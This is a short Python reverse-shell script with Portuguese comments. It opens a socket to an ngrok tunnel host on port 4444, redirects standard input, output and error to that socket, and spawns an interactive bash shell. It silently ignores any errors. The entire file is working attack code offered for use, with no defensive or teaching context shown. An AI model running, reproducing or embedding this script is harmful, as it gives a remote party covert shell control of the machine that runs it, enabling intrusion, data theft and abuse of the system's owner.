import socket
import os
import pty

HOST = "0098e90c3898.ngrok-free.app"  # Corrigido: sem https://
PORT = 4444

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT)) 
    
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # O Linux tem /bin/bash, então isso funciona perfeitamente lá.
    pty.spawn("/bin/bash") 
    
except Exception as e:
    pass
finally:
    try:
        s.close()
    except:
        pass
